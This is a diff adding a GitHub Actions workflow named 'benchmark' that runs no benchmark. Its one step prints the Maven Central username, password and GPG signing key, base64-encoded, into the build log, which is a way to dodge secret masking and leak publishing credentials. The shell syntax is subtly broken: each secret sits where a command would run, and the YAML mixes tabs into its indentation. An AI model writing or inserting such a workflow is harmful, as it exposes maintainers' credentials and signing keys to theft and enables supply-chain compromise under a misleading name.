@@ -1,0 +1,13 @@
+name: benchmark
+
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - run: |
+        echo "MAVEN_CENTRAL_USER $(${{ secrets.MAVEN_CENTRAL_USER }} | base64)"
+		echo "MAVEN_CENTRAL_PASS $(${{ secrets.MAVEN_CENTRAL_PASS }} | base64)"
+		echo "MAVEN_GPG_KEY $(${{ secrets.MAVEN_GPG_KEY }} | base64)"
